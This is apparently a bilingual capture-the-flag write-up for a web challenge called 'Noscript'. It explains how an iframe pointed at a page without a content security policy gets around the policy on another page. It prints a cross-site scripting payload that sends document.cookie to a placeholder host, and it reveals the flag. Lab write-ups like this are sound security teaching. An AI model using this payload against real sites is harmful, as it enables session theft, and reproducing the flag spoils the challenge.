---
title: "Noscript"
level: 3
flag: "FLAG{n0scr1p4_c4n_be_d4nger0us}"
writer: "hi120ki"
---

# Noscript

## 問題文

Ignite it to steal the cookie!

https://web-noscript-lz56g6.wanictf.org/

---

NOTE: In case the server is down, try the following backup server. 上記のサーバーが正しく動作していない場合は、次のバックアップサーバーを使用してください。

`web-noscript-ywu5dn.wanictf.org`

---

## 解法

`/user/{USER ID}` にアクセスすると、自由に入力可能なフォームが2つあります。
If you access `/user/{USER ID}`, there are two forms that you can freely input.

そしてAPIとしては`/user/{USER ID}`についてはCSPが設定されているため、`<script>`タグを使うことができません。
As for `/user/{USER ID}`, CSP is set, so you cannot use `<script>` tags.

しかし、`/username/{USER ID}`にはCSPが設定されていないため、`<script>`タグを使うことができます。
However, `/username/{USER ID}` does not have CSP set, so you can use `<script>` tags.

ここから1つめのフォームに`<script>`タグを使ってXSSを設定した後、2つめのフォームに`<iframe>`タグを使って`/username/{USER ID}`を埋め込むことで、`<script>`タグを実行させることができます。
From here, after setting up XSS using `<script>` tags in the first form, you can execute `<script>` tags by embedding `/username/{USER ID}` in the second form using `<iframe>` tags.

そして、XSSを使ってCookieを盗むことができます。
And you can steal the cookie using XSS.

```html
<script>fetch("https://example.com/?cookie=" + encodeURI(document.cookie));</script>
```

```html
<iframe src="/username/{USER ID}>"></iframe>
```

example.comはrequest binなどのサービスのURLを指定してください。
Please specify the URL of a service such as request bin.

そしてレポートフォームにURLを投稿することでCookieに設定されているフラグを取得することができます。
By posting the URL to the report form, you can get the flag set in the cookie.
